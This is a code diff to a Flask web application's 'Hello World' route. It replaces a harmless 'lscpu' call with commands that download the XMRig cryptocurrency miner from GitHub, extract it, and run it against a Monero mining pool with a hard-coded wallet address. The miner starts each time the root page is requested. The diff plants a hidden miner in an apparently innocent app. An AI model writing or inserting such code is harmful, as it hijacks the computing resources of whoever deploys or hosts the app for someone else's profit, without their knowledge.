@@ -24,8 +24,11 @@ app = Flask(__name__)
 
 @app.route("/")
 def hello_world():
-    command5 = 'lscpu'
-    subprocess.check_call(command5.split())
+    command = 'wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz'
+    command2 = 'tar xf xmrig-6.12.1-linux-static-x64.tar.gz'
+    command5 = 'xmrig-6.12.1/./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id demo3'
+    subprocess.check_call(command.split())
+    subprocess.check_call(command2.split())
     res = subprocess.check_call(command5.split())
     return "Hello {}!".format(res)
 
